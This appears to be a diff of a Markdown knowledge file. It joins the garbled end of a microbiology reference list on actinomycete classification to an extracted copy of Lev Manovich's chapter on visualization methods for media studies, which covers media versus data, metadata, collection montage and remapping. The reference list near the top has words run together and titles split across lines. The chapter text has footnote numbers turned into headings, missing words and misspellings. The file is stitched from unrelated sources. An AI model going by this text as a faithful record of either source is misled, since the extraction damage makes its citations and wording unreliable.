+SVESHNIKOVA.1957.Prob-
+lemsof
+classificationofactinomycete-antagonists.Institute
+for
+## Research
+ofNewAntibiotics,AcademyofMedical
+## Sciences,
+NationalPressof
+## Medical
+Literature,Medzig,
+## Mos-
+cow.
+## JACOBSON,E.,
+## W.
+## C.GRANVILLE,
+ANDC.E.Foss.1948.Color
+harmonymanual,3rded.Container
+CorporationofAmerica,
+## Chicago.
+## PRIDHAM,
+## T.
+## G.,
+## C.
+## W.HESSELTINE,
+## AND
+## R.
+## G.
+## BENEDICT.1958.A
+guide
+for
+the
+classification
+of
+streptomycetesaccording
+to
+selected
+groups.
+## Placement
+of
+strains
+in
+morphological
+sections.
+## Appl.
+## Microbiol.6:52-79.
+## WAKSMAN,
+## S.A.
+1961.Classification,
+identificationanddescription
+of
+genera
+and
+species.
+## The
+actinomycetes,
+vol.2.
+## The
+## Williams
+## &
+## Wilkins
+## Co.,
+## Baltimore.
+## 338
+## APPL.
+## I'XIICROBIOL.
+Downloaded from https://journals.asm.org/journal/am on 05 May 2026 by 36.77.102.63.
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs]
 
 ### 📘 KNOWLEDGE: NEXUS_UPGRADE_NEXUS_ENGINE_BUILDER.MD
 
@@ -20611,6 +37870,1161 @@ Roadmap ini baru bisa dimulai ketika:
 
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, api]
+
+### 📘 KNOWLEDGE: NEXUS_VISUALIZATION_METHODS_FOR_MEDIA_STUDIES.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+Visualization Methods for Media Studies
+
+## Lev Manovich
+
+
+In the first decade of the 21
+st
+century, the researchers in the humanities and humanistic social
+sciences have gradually started to adopt computational and visualization tools. The majority of
+this work often referred as “digital humanities” has focused on textual data (e.g.,  literature,
+historical records, or social media) and spatial data (e.g.,  locations of people, places, or
+events).
+## 1
+H owever, visual media have remained outside of the new computational paradigm. To
+fill this void, in 2007 I  established the Software Studies Initiative at University of California, San
+## Diego.
+## 2
+Our first goal was to develop easy to use techniques for visualization and computational
+analysis of large collections of images and video suitable for researchers in media studies, the
+humanities, and the social sciences who do not have technical background, and to apply these
+techniques to progressively large media data sets. Our second goal was theoretical -  to
+examine existing practices and assumptions of visualization and computational data analysis
+(thus the name “Software Studies”), and articulate new research questions enabled by
+humanistic computational work with “big cultural data” in general, and visual media specifically.
+## 3
+
+
+This chapter draws on the number of my articles written since we started the lab where I discuss
+history of visualization, the techniques that we developed for visualizing large sets of visual
+media, and their applications to various types of media.
+## 4
+The reader is advised to consult these
+articles on the details of visualization methods presented and detailed analysis of their
+applications. The first purpose of this chapter is to bring together the key theoretical points
+developed across these articles.
+
+In doing this, I also want to articulate the connections between some of the key concepts
+involved in visualizing media for humanities research -    “artifact,” “ data,” “metadata,”  “feature”,
+
+## 1
+For recent discussions of digital humanities, see David M. Berry, ed., Understanding Digital
+Humanities (Palgrave Macmillan, 2012); Matthew K. Gold, ed. Debates in the Digital Humanities
+(University Of Minnesota Press, 2012); Katherine Hayles, How We Think: Digital Media and
+Contemporary Technogenesis (University Of Chicago Press, 2012); Anne Burdick, Johanna
+Drucker, Peter Lunenfeld, Todd Presner, Jeffrey Schnapp, Digital Humanities (The MIT Press,
+2012); Stephen Ramsay, Reading Machines: Toward an Algorithmic Criticism (University of
+## Illinois Press, 2011).
+## 2
+
+www.softwarestudies.com.
+## 3
+To separate this research from many other kinds of work included in 2000s under the umbrella
+term “digital humanities,” I introduced the term Cultural Analytics to refer to the use of
+visualization and quantitative analysis of large sets of visual and interactive artifacts for
+humanities research and teaching. See Lev Manovich, “Cultural Analytics: Visualizing Cultural
+Patterns in the Era of ‘More Media’,” Domus (Milan), 2009.
+## 4
+T he key articles are: Lev Manovich, "What is visualization?" Visual Studies, vol. 26, no.1
+(2011): 36-49; Lev Manovich, “How to compare one million images?” in Understanding Digital
+Humanities, ed. David Berry (New York: Palgrave Macmillan, 2012); Lev Manovich, “Media
+Visualization: Visual Techniques for Exploring Large Media Collections,” in Media Studies
+Futures, ed. Kelly Gates (Blackwell, 2012).
+
+## 2
+“mapping,”  and “remapping.” We can relate these concepts in three ways. Firstly, we can look at
+these and other related concepts as series of oppositions: artifact vs. data, data vs. metadata,
+close reading vs. distant reading. Secondly, since the combination of these concepts
+correspond to fundamental conceptual steps used in various visualization methods, we can
+examine theoretically at each of these steps (translating from artifacts to data, adding new
+metadata, extracting features, mapping and remapping from data to a visual representation.)
+
+Thirdly, we can organize our discussion in terms of these methods. For example, visualization
+can show the metadata about the artifacts or the actual artifacts; a researcher can use existing
+metadata or add new ones. The conceptual characterization of these fundamental methods is
+the third goal of this chapter. It organizes the methods along two conceptual dimensions. The
+first dimension describes what is the prime object being visualized -  data or metadata. The
+second dimension describes the two key ways of augmenting the original data with new
+information used in visualization –   manual annotation or automatic feature extraction.
+
+Since my lab focused on working with visual media data sets -  photography, images of art, films,
+cartoons, motion graphics, video games, book pages, magazine covers and pages, and so o n –
+all the methods described will be immediately applicable to all types of visual media. However,
+as I will explain, not all of them will work with other types of media because of the particular
+properties of images and human vision.
+
+
+Artistic Visualization and Humanities
+
+## [ INSERT FIGURE 1 HERE ]
+
+There is a multitude of visualization techniques available today.
+## 5
+The systematic history of their
+development, the connections to the need of modern societies and science analyze and
+manage progressively larger amounts of data, and, more recently, the increasing capacities of
+computer technologies, remains to be written, but at least key milestones are known.
+## 6
+## For
+example, popular software such as Excel, Tableau, manyeyes, and others offer a set of
+graphing techniques which were developed already in the first decades of the 19th century -  pie
+charts, bar charts, scatterplots, radar charts, histograms, etc. The same period also witnessed
+the development of 2D thematic maps that visualized data on variety of topics. The adoption of
+computers led to many new techniques, as well as gradual increase in information density of
+representations since software programs could visualize much larger amounts of data when it
+was practical to do by hand. The rapid development of 3D computer graphics technologies in
+the 1980s made possible the development of the new field of scientific visualization. The next
+
+## 5
+See Nathan Yau, Visualize This: The FlowingData Guide to Design, Visualization, and
+Statistics (Wiley, 2011).
+## 6
+Michael Friendly and Daniel J. Denis, Milestones in the History of Thematic
+Cartography, Statistical Graphics, and Data Visualization,
+http://datavis.ca/milestones/;
+http://www.datavis.ca/gallery/index.php.
+
+## 3
+wave was the rise of information visualization in the 1990s that introduced new 2D techniques
+(such as hyperbolic trees and treemaps) for representing non-numerical data.
+
+In the late 1990s, information visualization started to attract attention of new media artists; by
+2004 multitude of projects they created reached a point where it became meaningful to talk
+about the new area of “artistic visualization.”
+## 7
+Although this new area of culture continued to
+grow, with visualization projects included in major museum exhibitions, the term itself remained
+problematic. (For one thing most celebrated examples of artistic visualizations were created by
+professionally trained designers Ben Fry and Lee Byron, and s cientist Martin Wattenberg). One
+way to define artistic visualization is by contrasting it to the “normal” use of visualization in
+science, business and mass media. If these fields use visualization functionally, with a designer
+aiming to represent the relationships in a data given to her by the client without making any
+independent statement about it (we call this position “design neutrality”), artistic visualization
+projects deliberately aim to make such statements. The goal, in other words, is not a
+representation of data for its own sake but rather a statement about the world and human
+beings made through particular choices of the data sets and their presentation.
+## 8
+
+
+As artistic visualization became popular with digital artists and designers, the number of people
+doing this work kept increasing. (Significant factors here were the development of Processing
+high-level graphics language designed specifically for artists, and the availability of data from
+major social media sites via their APIs.) A constant competition on the level of form became
+another distinguishing feature of artistic visualization. We can say that the history of
+visualization entered a new “modernist” stage where the invention of new techniques (or, at
+least, new variations of the existing techniques) came to be valued for its own sake. Indeed, a
+survey of the most influential artistic visualization projects of 2000s shows that none of them
+used already well-know visualization techniques but instead defined new ones. Some of these
+new techniques were given explicit names and since their introduction in particular projects
+were adopted by other designers (for example, arc diagrams from The Shape of Song by Martin
+Wattenberg, 2001, Streamgraph from Lee Byron’s Listening History, 2006); others only
+appeared in unique visualization projects ( Fernanda B. Viégas and Martin Wattenberg, History
+Flow, 2002; On the Origin of Species: The Preservation of Favoured Traces by Ben Fry, 2009.)
+
+However, the artistic projects that are able to introduce really new visualization techniques are
+exceptions; the majority of projects are only able to distinguish themselves by customizing
+already existing techniques. For example, consider visualcomplexity.com, the influential
+
+## 77
+See Lev Manovich, “Data Visualization as New Abstraction and Anti-Sublime,” SMAC! 3 (San
+## Francisco, 2002),
+http://lab.softwarestudies.com/2008/09/cultural-analytics.html; Andrew Vande Moere, “About the
+## Information Aesthetics Weblog” (12/2004),
+http://infosthetics.com/information_aesthetics_about.html; Fernanda B. Viégas and Martin
+Wattenberg, “Artistic Data Visualization: Beyond Visual Analytics,” Proceedings of the 2nd
+International Conference on Online Communities and Social Computing. Springer-Verlag Berlin,
+## 2007,
+http://www.research.ibm.com/visual/papers/artistic-infovis.pdf.
+## 8
+For fruther discussion, see Lev Manovich, “Introduction,” in Manual Lima, Visual Complexity
+(Princeton Architectural Press, 2011).
+
+## 4
+collection of important projects that visualize complex networks curated by designer and writer
+Manual Lima since 2004.  Browsing this collection of over 700 visualizations can create an
+impression of almost infinite visual diversity. However, filtering them by “method” shows that
+many of them are variations of the same small number of visualization methods.
+## 9
+(In other
+words, the visual diversity of visualization field today is partly an artifact of the use of software
+that allows rendering the same   fundamental layouts   in multitude of ways.)
+
+The endless surface variations of the small number of fundamental visualization techniques and
+layouts may also hide another important constant, which did not change since Charles de
+Fourcroy’s proportional squares graphs (1782) and William P layfair’s line graph and bar chart
+## (1786).
+## 10
+Almost all information visualization techniques use a small vocabulary of discrete
+abstract elements: rectangles, circles, strait and curved lines, and a few others. Typically, a
+restricted set of a few distinct colors is used to color these elements. In other words, the visual
+language of graphs and visualization is the same as that of modernist geometric abstraction
+(1912-) and modern graphic design (1919-). Can we say that the graphs which start to first
+appear in the second part of the 18th century and become commonplace in scientific
+publications in the first part of the 19th century anticipate the development of abstract visual
+language in art and design a hundred years later? This is just one of many intriguing questions
+which waiting to be investigated by the future historians of visualization.
+## 11
+
+
+
+How can we use visualization in humanities and media studies? The common sequence of
+steps in creating a visualization involves getting the data, organizing it in the appropriate format,
+and transforming it into images or animations using already existing or newly proposed
+technique -  with the help of existing or newly developed custom software. If we want to visualize
+the existing data about cultural artifacts -  for example, the lists of most popular books on
+amazon.com, the numbers of artworks created in different historical periods in different genres
+in museum collections, or the dates and locations of tens of thousands of letters exchanged by
+Enlightment thinkers in the 18
+th
+century (as in Mapping the Republic of Letters project at
+## Stanford University)
+## 12
+-   we can follow the same sequence of steps. In this workflow, the
+information about the lives or properties of media artifacts    ends up as the familiar graphical
+elements of information visualization (points, lines and other graphical elements).
+
+But can visualization also support -  and hopefully augment -  the key methodology of humanities:
+systematic and detailed examination of cultural artifacts themselves, as opposed to only the
+
+## 9
+http://www.visualcomplexity.com/vc/, filter by “method.”
+## 10
+Milestones in the History of Thematic Cartography, 1970s,
+http://www.datavis.ca/milestones/index.php?group=1700s.
+## 11
+Such an analysis will have to take into account the popularity of isotypes developed by Otto
+Neurath in 1920s who -  while also using modernist aesthetics of simplicity and restricted
+geometry -  also believed that isotypes will be more effective because of their iconicity.
+## 12
+Daniel Chang, Yuankai Ge, Shiwei Song, Nicole Coleman, Jon Christensen, and Jeffrey
+Heer, “Visualizing the Republic of Letters”,
+http://www.stanford.edu/group/toolingup/rplviz/papers/Vis_RofL_2009, 2009.
+
+## 5
+data about the social and economic lives of these artifacts? For example, Mapping the Republic
+of Letters projects successfully uses visualization to examine patterns in correspondence
+between European Enlightment thinkers. But can visualization show all the Enlightment letters
+directly rather than only dates, authors and places information – in such a way that we can both
+read any parts of these letters and at the same time see large-s cale patterns? Or, to take
+another example, can visualization take further the André Malraux’ idea of “museum without
+walls” (comparing themes and formal elements in all photographed works of art
+## 13
+)  which he
+proposed in the middle of the 20
+th
+century -  to allow us compare millions of professional
+artworks available on museum web sites, or billions of user-generated artworks on social media
+sites? In other words, how do we combine microscopic and telescopic vision, close reading and
+distant reading –   “reading” the actual artifacts and “reading” larger patterns abstracted from very
+large sets of these artifacts?
+
+
+Media vs. Data
+
+Normally, a visualization designer works for a client who provides her with the data; the
+designer’s job is to figure out the best way to display this data so the relationships and patterns
+in it become visible. However, if you a media or humanities scholar, there is no given “data”  to
+start with. Instead, we have concrete artifacts which can come from a variety of different cultural
+fields: user-generated digital content, interactive design, web design, computer games, web
+sites, blogs, books, photographs, visual art, films, cartoons, motion graphics, graphic design,
+industrial design, fashion, space design, etc. This means that the default assumption of
+visualization that we can start with some already existing data can’t be taken for granted.
+
+There are a number of important conceptual issues involved in doing the translation from
+artifacts to data –   here I will describe just three of them.
+## 14
+
+
+1) The steps for translating cultural artifacts into “data” which captures their content, form, and
+use (reading, sharing, remixing, etc.) are not standardized -  in many cases, they have to be
+invented and theorized. For example, what it is the “data” in the case of a web page? To make
+web search work, Google algorithms extract over 250 details from every web page they can
+find: all text, all links, fonts and colors of every paragraph, layout, etc. (The concrete details of
+this process are kept secret.) Would such representation of a web page be appropriate for me if
+I want to study and visualize the evolution of the web design since 1996, using a sample of 150
+
+## 13
+Linda Nochlin, “Museum without Walls,” New York Times, May 1, 2005,
+http://query.nytimes.com/gst/fullpage.html?res=9B0CE2DC1431F932A35756C0A9639C8B63.
+## 14
+My discission only touches on the dimensions of this problem which I see as most relevant to
+visualizing media. For the theoretical and historical analysis of data practices in the sciences,
+see Geoffrey C. Bowker, Memory Practices in the Sciences (The MIT Press, 2006). For the
+analysis of the impact of big data on scholarly research and communication, see Christine L.
+Borgman, Scholarship in the Digital Age: Information, Infrastructure, and the Internet (The MIT
+## Press, 2007).
+
+## 6
+billion historical snapshots of web pages from archive.org?
+## 15
+The seemingly logical answer is
+that this depends on the questions one I want to ask (for Google, the goal is to determine most
+relevant pages to the user query). However, in the case of media research, starting with well-
+formulated questions does not use what visualization is best at: exploring a large data set
+without preconceived ideas to discover “what it is there” and to find novel patterns, as opposed
+to only test already formulated ideas. (We can call this exploratory visualization.)
+Even in the case of the most familiar “old media” artifacts such as printed books, it is not
+immediately obvious what is their “data.” While typical text analysis looks at dematerialized
+“text” disregarding the particular formats in which it was presented to the readers, the Google
+search example suggests that if we are interested in reception of literature as a print medium,
+we do need to take into account all the details of its appearance and materiality (fonts, colors,
+line spacing, layout, margins, and even weight of a book).
+
+2) Being able to translate media artifacts into data often requires specialized technical
+knowledge besides the domain knowledge: image processing in the case of images,
+computational linguistics in the case of text, audio signal processing in the case of music. To
+take an a concrete example from our lab, we downloaded tens of thousands of pages of
+Science and Popular Science magazines published between 1870 and 1922 from Google
+Books, and found that different sets of pages have different contrast levels. Let’s say we decide
+that we will normalize the contrast (the decision which itself needs to be theoretically motivated).
+There is no single right way of doing it. There are various image processing algorithms that can
+be used, and each will produce a different kind of “data” as a result.
+
+3) Translating collections of artifacts into data and then visualizing this data may “through the
+baby away with the water.” That is, examining information visualizations of data representing
+aspects of cultural artifacts can lead to new understanding but it does not substitute getting
+insights via viewing the artifacts themselves. The last consideration is particularly important for
+the future of visualization in humanities, since perhaps the most important question, which is still
+unresolved, is    how to combine distant and close readings.  While all normal visualization
+techniques involve some reduction in order to reveal patterns, the price of this reduction is not
+just visibility (of new patterns) but also opacity, as the media artifacts with all their aesthetic
+richness and detail are substituted by abstract points, rectangles, lines, and curves.
+
+In other words, the “close reading” and “distant reading” (as supported by information
+visualization) lead to different knowledge. Examining a text cloud visualization which shows
+most frequently used works in a text in order of their frequency is not the same as carefully
+reading the text itself. To take an opposite example, l ooking at the images of 9000 pages from
+Popular Science magazine (see fig. 2 below) is not the same as examining the graph that only
+shows metadata about these covers over time.
+
+This discussion should explain why I gave the field of artistic visualization a prominent place in
+sketching the recent history of visualization. The “artistic” dimension of artistic visualization
+
+## 15
+
+http://archive.org/web/web.php.
+
+## 7
+relevant for humanities is problematizing the standard visualization process, and specifically the
+translation of some “reality” into data. If representational cultural artifacts involve a translation –
+from a story, a visible world, memory, or some other type of “reality” to the signs in the artifact –
+visualization requires the secondary translation that maps the materiality of the artifacts into
+something that can be put into a spreadsheet or a database. In other words, it is a
+representation of a representation, a map of a map. Like any new map, it selects and omits,
+reveals some things and makes invisible others.
+
+
+Data vs. Metadata
+
+Having understood some of the conceptual and practical challenges of translating media
+artifacts into data, let us now assume that this step has been accomplished, so we can move
+forward in our discussion. Usually we can also assume that the media artifacts come with some
+metadata recorded by institutions, individuals, or software systems. For instance, over one
+million digital images of art, architecture and photography available via artstor.org collection are
+annotated with the name of the artist, year and country of creation, original size, etc. The
+metadata for every video on YouTube included category, tags, upload date, number of views,
+numbers of likes and dislikes, and so on. This metadata also needs to be problematized –   rather
+than taking for granted the categories that it uses, we need to ask if they are meaningful. (For
+example, in the case of social media, is common to have metadata that specifies the countries
+where the users live. But what does it mean that a particular user leaves in country X? Does she
+leave in a capital or in a small city; was she born there and only moved there recently for
+school? In other words, the automatic assumption that a set of random people who happened to
+list the country X will have something in common is ungrounded.)
+
+Metadata is the data about the data. Normally we assume that our goal is to study media, and
+the role of the metadata is to support this. However, as the amounts of media bring generated
+by billions of consumer devices keep growing (think of all the hours of video uploaded to
+YouTube every minute), the direct study of media data becomes impossible with the current
+methods. Instead, researchers study the metadata – because its much smaller in size than the
+data, because it contains structured categorical information which is easy to graph and analyze,
+and also because it can reveal information which can’t be found in the data itself. For example,
+Mapping the Republic of Letters projects uses visualization to examine patterns in
+correspondence between European Enlightment thinkers. This is a typical example of the
+analysis where metadata itself becomes the primary object of study.
+
+Another example comes from a project in my lab to explore images from deviantArt, the largest
+social network for user-generated art. We started by downloading a sample of one million
+images, and we also obtained metadata for these images –   user screen names, upload dates,
+and the categories in which its creator placed each image. Having this metadata allows us to
+visualize the images in different ways. For instance, we can compare images submitted by
+different users, look at the patterns in deviantArt growth since 2000 using upload dates, and
+also compare images in different categories.
+
+## 8
+
+However, the category structure of DeviantArt is so interesting that we can study it   as the
+artifact in its own write. Consisting from close to 2000 separate labels organized into a
+hierarchical tree with as many as seven levels (i.e., Customization/Skins & Themes/Linux and
+Unix Utilities/Desktop Environments/KDE/Styles/, Photography/People & Portraits/Spontaneous
+Portraits), this system presents us with a fascinating portrait of contemporary cultural imaginary.
+Comparing this system with the one used by museums and academics to describe visual media
+reveals the massive gap between the institutions of high culture and the real world. While such
+categories as sculpture, painting, drawing or experimental    film are also present in DeviantArt,
+most of its categories do not have high culture equivalents (for examples, Stock images, Street
+Art/Stickers, or Digital Art/Pixel Art/Characters/Isometric), and yet they constitute the larger part
+of “non-professional art” today.
+
+## [ INSERT FIGURE 2 HERE ]
+[ Visualization of categories in dA ]
+
+In summary: What is a metadata from one perspective is the data from another perspective.
+
+
+Visualizing Metadata vs. Visualizing Media
+
+Metadata usually consists from text and numbers. We have access to a multitude of
+visualization techniques developed over last 300 years to represent these data types. These
+techniques are available in visualization, graphing and data analysis software, both free and
+commercial. This is another reason why practically all visualizations of humanities artifacts show
+only the metadata, but not the data itself.
+
+In 2000s a few projects by digital media artists and visualization designers showed that it is
+possible to construct visualizations which show not only information about the images or video
+collections, but the images themselves. The technique used in these projects was to sample a
+feature film, and then display the sampled frames in a rectangular grid in the sequence
+corresponding to their order in the film. We created free software tools that implement these
+techniques, adds various options, and also makes it applicable to large collections of still
+images. We successfully applied the techniques introduced in these projects to variety of media
+forms including magazine pages, newspaper pages, comic and manga books, films, animation,
+and motion graphics.
+
+Present images in a collection in a grid organized by the existing metadata such as creation or
+upload dates is conceptually the simplest way of visualizing an image collection.
+## 16
+We call this
+
+## 16
+In computer science a number of researchers published papers which present more complex
+techniques for visualizing media colllections. However, implementing and using any of these
+techniques requires substantial technical knoweldge which the users in humanities and media
+studies do not have currently do not have. Therefore, we focused on first implementing and
+popularizing the techniques which are both very simple to use and very simple to explain –   such
+
+## 9
+technique collection montage.  This technique can be seen as an extension of the most basic
+intellectual operations of humanities – comparison between a small number of artifacts (typically
+just two) However, if 20th century technologies only allowed for a comparison between a small
+number of artifacts at the same time –   for example, the standard lecturing method in art history
+was to use two slide projectors to show and discuss two images side by side –   we can now
+compare multitudes of images by displaying them simultaneously on a computer screen. The
+computer graphics capacities of the current off-the-shelf computer devices ( including smart
+phones, tablets, laptops, desktops) also allow us interact in real time with such visualizations if
+they show a few thousands of images only –   zooming, and sorting images in different ways
+using of any of available metadata. But we can also construct and display static visualizations
+that can contain much larger numbers of images (for instance, using the software I wrote I
+rendered visualization which shows one million manga pages.)
+
+This quantitative extension leads to a qualitative change in the kinds of observations that can be
+made. Being able to display thousands of images simultaneously allows us to see gradual
+subtle historical changes over tens of thousands of images, find which images are typical and
+which are unique, understand the patterns of similarity and difference between multiple sets of
+images of any size, and do many other kinds of analysis.
+
+## [  INSERT FIGURE 3   HERE ]
+[  Popular Science montage ]
+
+(Note that a rectangular grid is not the only way to display a collection. Fig, 4 below) shows
+another display technique that we use equally frequently. Here images are sorted in two
+dimensions according to their visual characteristics. This technique typically produces a view of
+an image collection that looks like a cloud, with image density varied in different parts of the
+visualization. Image with similar characteristics form tight clusters, while images with unique
+characteristics lie outside these clusters. The technique extends the familiar scatter plot by
+adding images on top of the data points. In general, we refer to the displays which show the
+actual images in a collection as media visualizations – to contrast this method with information
+visualization which can only show information about the collection.)
+
+Although collection montage is conceptually the simplest technique, it is quite challenging to
+characterize it theoretically in terms of where it fits into existing media forms.  Given that
+information visualization normally starts with the text, numbers, network connection or other
+
+as an image plot.  For examples of research in this area, see G. P. Nguyen, M. Worring,
+“Interactive access to large image collections using similarity-based visualization,” Journal of
+Visual Languages and Computing, v.19 n.2 (April 2008), pp. 203-224; Jing Yang,  “ Semantic
+image browser: Bridging information visualization with automated intelligent image analysis,”
+Proc. of 2006 IEEE Symposium on Visual Analytics Science and Technology; Schaefer, Gerald.
+"Interactive Navigation of Image Collections." FGIT 2011: Future Generation Information
+Technology: Third International Conference ( Springer, 2012); Gerald Schaefer,  "Image
+browsers — Effective and efficient tools for managing large image collections," 2011
+International Conference on Multimedia Computing and Systems (ICMCS.
+
+## 10
+data type that is not “visual media” and then represents this data visual domain, is it appropriate
+to consider image montage as a visualization method? In this case, we start with visual domain
+and we end up in the same domain -  starting with individual images and zooming out to see all
+of them. In other words, if standard information visualization translates data into pictures, here
+we translate pictures into pictures.
+
+I think that calling this technique “visualization” is justified,  if instead of focusing on the
+transformation operation of visualization (from non-visual to visual), we focus on its other key
+operation: layout, i.e., arranging the elements of visualization in such a way that allows   the user
+to notice the patterns which are hard to observe in raw data. From this perspective, image
+montage is a visualization method. For example, the current interface of Google Books does not
+allow viewing thousands of pages of a magazine such as Popular science in a single screen, so
+it is hard to observe the historical patterns. However, when gather all these pages and arrange
+them in a particular layout (making their size the same and displaying them in a rectangular
+grid) using the key principle of information visualization -   making everything the same on all
+visual dimensions except the ones where the brain will be making comparisons -  these patterns
+become easy to see.
+
+In its simplest form, image montage shows all images in a collection. However, with video this
+does not work –   typically the changes between each subsequent frames are very so tiny, and
+showing every single frames obscures larger patterns of temporal change in content and visual
+form. Instead, it is more useful to sample the video, and only show the sampled frames (as this
+was done in the pioneering artistic visualization projects which I referred to above.) We can also
+apply this method to any sequential media such as newspaper pages or comic book pages. For
+instance, animated visualization created by my undergraduate student Cyrus Kiani uses 5930
+front pages from The Hawaiian Star covering 1893-1912 period.
+## 17
+The animation of 5930 front
+pages of the newspaper published during these 20 years for the first time make visible how
+visual design of modern print media changes over time, in search of the form appropriate to the
+new conditions of reception and new rhythm of modern life. (Some of the important relevant
+cultural developments during this period include development of abstract art which leads to
+modern graphic design, the introduction of image oriented magazines such as Vogue, the
+spread of the new medium of cinema, invention of phototelegraph, and the first telefax machine
+to scan any two-dimensional image.)
+
+The sampling procedure should not be thought about as a simple mechanical step (i.e., sample
+a video at 1 frame per second) or a necessary step when the data is big (as it was understood
+in 19
+th
+and 20
+th
+century statistics). While we can easily create a visualization showing 160,000+
+frames making up a typical feature film (90 minutes = 5400 seconds = 162000 frames,
+assuming 30 fps rate), d oing this is just not useful, as I just explained. Instead, we can think of
+sampling as a creative strategy that can be applied to any dimension of the media data. For
+example, in the case of an image collection, we can sample both in time (selecting every Nth
+image) and in space (selecting only part of every image).
+
+## 17
+http://lab.softwarestudies.com/2012/03/visualizing-newspapers-history-hawaiian.html.
+
+## 11
+
+By experimenting with different ways of arranging these media samples, novel patterns can be
+discovered. For instance, I made a visualization which compared fist and last frames of every
+shot in 1928 film Eleventh Year by Russian directory Dziga Vertov. ”Vertov” is a neologism
+invented by the film director who adapted it as his last name early in his career. It comes from
+the Russian verb vertet, which means “to rotate.” “Vertov” may refer to the basic motion involved
+in filming in the 1920s –   rotating the handle of a camera –   and also the dynamism of film
+language developed by Vertov who, along with a number of other Russian and European
+filmmakers, designers and photographs working in that decade, wanted to “defamiliarize”
+familiar reality by using dynamic diagonal compositions and shooting from unusual points of
+view. However, my visualization suggests a very different picture of Vertov. Almost every shot of
+The Eleventh Year starts and ends with practically the same composition and subject. In other
+words, the shots are largely static.
+
+I refer to the visualization method that this visualization illustrates as remapping. Why? Any
+representation can be understood as a result of a mapping operation. I am using the term
+“mapping”  here not in a sense of production of a map of a territory but in its more abstract
+mathematical sense -  a function that creates a correspondence between the elements in two
+domains. A familiar example of such mapping is projection systems used to create two-
+dimensional images of three-  dimensional scenes such as isometric projection and perspective
+projection. We can also think of well-know triad of signs defined by Charles Pierce (icon, index,
+symbol) as different types of mapping between an object and its representation.
+## 18
+
+
+Modern industrial media -  photography, film, audio and video recoding -  led to an emergence of
+a popular artistic strategy of using an already existing media work and creating a new meaning
+or aesthetic effect by sampling and re-arranging parts of this work. This strategy has been
+central to modern art since the second part of the 1950s. Its different manifestations include pop
+art, remix, appropriation art, and a significant part of media art -  from Bruce Conner’s very first
+compilation film A Movie (1958) to Douglas Gordon’s 24 Hour Psycho (1993), J oachim Sauter
+and Dirk Joachim’ The Invisible Shapes of Things Past (1995), Jennifer and Kevin McCoy’
+Every Shot / Every Episode (2001), and numerous others.
+
+Because many of these media art projects derive their meaning and aesthetic effect from
+systematically re-arranging the samples of original media in a new configuration, we think it is
+logical to refer to them not simply as mapping, but rather as remapping. If the original media
+object -  a TV show, a feature film, a newspaper page, etc. -  was an original media map of
+“reality”, the art project that re-arranges its elements is a re-mapping.
+
+
+## 18
+Twentieth century cultural theory often stressed that cultural repesentations are always partial
+maps since they can only show some aspects of the objects. However, given the dozens of
+recently developed methods for capturing data about physical objects and the ability to process
+massive amounts of data to extract new information -  something which, for instance Google
+does a few times a day than it analyzes over a trillion web links -  this assumption needs to be
+re-thought.
+
+## 12
+Our use of sampling and rearranging of the samples in new layouts can be conceptually related
+to this history. Reversely, many of the art projects that use the strategy of sampling and
+remapping can be retroactively understood as “media visualization.” They examine ideological
+patterns in mass media, experiment with new ways of navigating and interacting with media,
+and defamiliarize our perceptions.
+
+Although on the first glance the purpose of media visualization is simply “revealing patterns in
+the data,” it is certainly possible to defend the position that such visualiz  ations are more close to
+media art. Any remapping is a reinterpretation of the original media map, which not just teases
+out but also creates new interpretation and meanings.
+
+Media visualization represents one answer to the fundamental question of how to bring together
+close and distant reading. Step away, and you can see larger patterns across a whole media
+collection. Step closer, and you can study the details of individual images.
+
+From a semiotic perspective, media visualization breaks away from the traditional semiotics   of
+information visualizations. The abstract elements of information visualization are symbols –
+signs that signify by convention. (In this, infovis can be contrasted with maps that signify by
+resemblance, and thus semiotically are icons.) Media visualizations   show us the objects
+themselves, so there is no semiotic translation taking place. Rather than being symbolic
+representations of the objects, or their iconic maps, they are the instruments for understanding –
+a new epistemological technology enabled by software.
+
+Media visualization relies on our skill to instantly to see patterns in a single image. It constructs
+a new image out of all images (or their samples) in a collection, arranging them in such a way
+that the patterns across these images can be seen as easily. Note that this method would not
+work with sound or text collections, since listening and reading unfolds in time. So for example,
+while we can arrange thousands of letters in a single high-resolution visualization as we do with
+images, it would not work as visualization. But arrange hundreds of thousands of images
+together (sorted by metadata or visual features, as described below), and the patterns are easy
+to see.
+
+
+Adding New Metadata vs. Extracting Features
+
+The two fundamental methods described above –   using information visualization techniques to
+reveal patterns in the metadata, and using techniques drawn from media and digital art to
+display directly large media collections or their samples (and using metadata to organize the
+layouts) –   differ in regards to what is being visualized. Information visualization shows the
+metadata about the media. Media visualization shows the actual data. One thing that they do
+share is that both methods   did require adding any new information – they use already existing
+metadata and the contents of a collection.
+
+
+## 13
+I will now present two other methods that do rely on augmenting media data with new
+information. Both require additional work of adding this information but they differ in    how this
+information is created.
+
+One method that is used both in social media networks and in academic media studies and
+humanities is to manually add tags, or other kinds of annotations (for instance, categorical
+information such as in deviantArt network) using a natural language in which a researcher works
+in     (i.e. English, Mandarin, etc.) For example, people routinely add tags to images they upload to
+Flickr (I am using Flickr as an example here because it   popularized tagging which since then
+became the default feature of all social media platforms.)  If Flickr’s tag system employs “open
+vocabulary” model where any user can introduce new tags, academics usually follow “closed
+vocabulary” model where researchers agree on the set of tags beforehand, and then annotate a
+media collection using only these tags.
+
+Many social media sites such as deviantArt also use hierarchical categorical systems to
+organize the media submissions (see fig. 2). These categorical metadata systems are more
+useful than simple tags but they also need to be approached with caution. For example, our
+initial investigation of appr. 280,000 image sample from the two top categories “Traditional Art”
+and “Digital Art”  showed that while in general most users place their submissions in the
+appropriate categories, many do not (for example, the category “paintings” also contain many
+drawings.) Thus, rather than automatically assuming that categories metadata divides the data
+in the correct and “natural” manner, we need to think of data and metadata as two related but in
+the end independent entities. This view has two consequences. On the hand, the metadata itself
+needs to be approached as separate data set that needs to be investigated in its own right. On
+the other hand, automatic analysis of the data (to be discussed below) is likely to reveal clusters
+and groupings that do not correspond to metadata divisions.
+
+Modern social scientists and qualitative marketing researchers use yet another way of
+describing a set of objects –   rating objects using quantitative or qualitative scales. We can also
+use this approach to describe media artifacts: for instance, describing whether each image in a
+collection is abstract or representational on a scale of 1 to 5.
+
+However, whether we add tags, construct our own categories and place data there, or using
